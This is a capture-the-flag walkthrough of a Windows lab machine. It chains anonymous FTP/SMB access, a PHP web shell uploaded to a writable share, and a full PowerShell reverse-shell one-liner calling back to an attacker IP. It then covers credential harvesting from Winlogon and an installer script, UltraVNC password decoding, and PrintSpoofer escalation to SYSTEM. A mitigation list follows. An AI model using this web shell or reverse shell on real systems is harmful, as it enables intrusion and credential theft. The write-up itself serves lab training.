# AllSignsPoint2Pwnage

**Difficulty:** Medium
**Category:** Windows | SMB | Web | Privilege Escalation

## Summary

AllSignsPoint2Pwnage is a Windows-based digital-signage machine. The attack starts with anonymous FTP access, which reveals a clue about a hidden SMB share. The `images$` share is writable and maps to a web-accessible images directory, allowing PHP code execution.

A reverse shell is obtained as the `sign` user. Further enumeration reveals credentials stored in Winlogon, hardcoded Administrator credentials in an installation script, and an encrypted UltraVNC password.

For privilege escalation, `SeImpersonatePrivilege` is enabled for the `sign` user. `PrintSpoofer` is then used to obtain a SYSTEM shell. This overall path is consistent with the published walkthroughs for the room.

## Attack Chain

```text
Anonymous FTP
      ↓
notice.txt
      ↓
SMB Enumeration
      ↓
Writable images$ Share
      ↓
PHP Web Shell
      ↓
HTTP RCE
      ↓
PowerShell Reverse Shell
      ↓
sign User
      ↓
User Flag
      ↓
Winlogon Credentials
      ↓
Installs$ / Installation Script
      ↓
VNC Password
      ↓
SeImpersonatePrivilege
      ↓
PrintSpoofer
      ↓
NT AUTHORITY\SYSTEM
      ↓
Administrator Flag
```

# 1. Enumeration

Started with a full TCP scan:

```bash
nmap -sC -sV -p- <TARGET-IP>
```

The machine exposed six TCP ports below 1024. The relevant services included FTP, HTTP and SMB. Published walkthroughs also confirm that the answer to the first room question is 6.

### FTP Enumeration

FTP allowed anonymous access:

```bash
ftp <TARGET-IP>
```

After logging in, I found:

```text
notice.txt
```

Downloaded it:

```ftp
get notice.txt
```

The note contained a clue about a hidden Windows share used for storing the images.

### SMB Enumeration

Enumerated SMB shares:

```bash
smbclient -L //<TARGET-IP> -N
```

The interesting shares were:

```text
images$
Installs$
Users
```

The hidden share used for the images was:

```text
images$
```

This matches the room's first enumeration question and published walkthroughs.

# 2. Initial Access — SMB File Upload

Connected to the writable share:

```bash
smbclient //<TARGET-IP>/images$ -N
```

Tested whether the share allowed uploads:

```text
put test.txt
```

The upload succeeded.

Since the share corresponded to the web application's `/images/` directory, I tested whether PHP files uploaded through SMB could be executed by the web server.

Created `shell.php`:

```php
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Uploaded it:

```text
put shell.php
```

Then accessed the PHP shell through the web server:

```text
http://<TARGET-IP>/images/shell.php?cmd=whoami
```

The command executed as:

```text
desktop-997gg7d\sign
```

This confirmed Remote Code Execution as the `sign` user.

# 3. Reverse Shell

Started a listener on the AttackBox:

```bash
nc -lvnp 4444
```

Then triggered the PowerShell reverse shell through the PHP RCE.

The exact command used was:

```bash
curl -G "http://10.48.161.85/images/shell.php" \ 
  --data-urlencode "cmd=powershell -nop -w hidden -c \"\$c=New-Object Net.Sockets.TCPClient('10.49.110.30',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String);\$x=([text.encoding]::ASCII).GetBytes(\$o);try{\$s.Write(\$x,0,\$x.Length)}catch{};\$s.Flush()};\$c.Close()\""
```

This provided an interactive reverse shell as `sign`.

> Replace the target IP and AttackBox IP/port with the values from your own lab session.

# 4. Foothold Enumeration

Confirmed the current user:

```cmd
whoami
```

Output:

```text
desktop-997gg7d\sign
```

Checked the console session:

```cmd
quser
```

The logged-in console user was:

```text
sign
```

Therefore, the answer to the room question **"What user is signed into the console session?"** is:

```text
sign
```

## Hidden Administrative Share

From the shell, I enumerated the Windows shares:

```cmd
net share
```

The relevant hidden, non-standard share was:

```text
Installs$
```

This is the answer to the room's second Task 2 question.

# 5. User Flag

Moved to the `sign` user's Desktop:

```cmd
cd C:\Users\sign\Desktop
```

Listed the files:

```cmd
dir
```

The user flag was located at:

```text
C:\Users\sign\Desktop\user_flag.txt
```

Read it with:

```cmd
type user_flag.txt
```

# 6. User Password — Winlogon

The room hints that the user is automatically logged into the machine.

I checked the Windows Winlogon registry:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

The relevant values were:

```text
DefaultUserName
DefaultPassword
```

The `DefaultPassword` value contained the password for the `sign` account.

This is the intended method used by the room walkthroughs for the **Users Password** question.

# 7. Administrator Credentials

The hidden `Installs$` share corresponded to:

```text
C:\Installs
```

Enumerated the directory:

```cmd
cd C:\Installs
dir
```

An interesting file was:

```text
Install_www_and_deploy.bat
```

Read the batch script:

```cmd
type Install_www_and_deploy.bat
```

The script contained hardcoded Administrator credentials.

This provided the answer to the **Administrators Password** question.

## Installer Executable

The same batch script showed the executable used to run the installer with the Administrator credentials:

```text
PsExec.exe
```

Therefore:

```text
PsExec.exe
```

is the answer to the room's executable question.

# 8. VNC Password

The UltraVNC installation directory contained:

```text
C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini
```

Inspected the configuration:

```cmd
type "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini"
```

The file contained an encrypted VNC password in the:

```text
passwd=
```

Uploaded the decoder through SMB:

```bash
smbclient //<TARGET-IP>/images$ -N
```

Then:

```text
put vncpwd.exe
```

From the target, the decoder can be executed with the encrypted value:

```cmd
vncpwd.exe <ENCRYPTED-VNC-PASSWORD>
```

The decoder returns the recovered VNC password.


# 9. Privilege Enumeration

After obtaining the `sign` shell, I checked the available privileges:

```cmd
whoami /priv
```

The important privilege was:

```text
SeImpersonatePrivilege    Enabled
```

This privilege allows a process to impersonate another security context and provides a common Windows privilege-escalation path.

For this machine, `PrintSpoofer` was suitable for abusing the privilege. Published walkthroughs for this room use the same `SeImpersonatePrivilege → PrintSpoofer` path.

# 10. Privilege Escalation — PrintSpoofer

Obtained `PrintSpoofer64.exe` and uploaded it through the writable SMB share:

```bash
smbclient //<TARGET-IP>/images$ -N
```

Uploaded the executable:

```text
put PrintSpoofer64.exe
```

Because `images$` maps to the XAMPP web directory, the executable was available at:

```text
C:\xampp\htdocs\images\PrintSpoofer64.exe
```

Executed:

```cmd
C:\xampp\htdocs\images\PrintSpoofer64.exe -i -c cmd.exe
```

Verified the resulting shell:

```cmd
whoami
```

The result was:

```text
nt authority\system
```

This confirmed successful privilege escalation to SYSTEM.

# 11. Administrator Flag

With SYSTEM-level access, moved to the Administrator Desktop:

```cmd
cd C:\Users\Administrator\Desktop
```

Listed the directory:

```cmd
dir
```

The final flag was:

```text
admin_flag.txt
```

Read it with:

```cmd
type admin_flag.txt
```

This completed the machine.


# Mitigation

1. Disable anonymous FTP/SMB access where it is not required.
2. Prevent executable PHP files from being uploaded to web-accessible directories.
3. Never store plaintext credentials in Winlogon registry keys or installation scripts.
4. Remove unnecessary `SeImpersonatePrivilege` from low-privileged accounts.
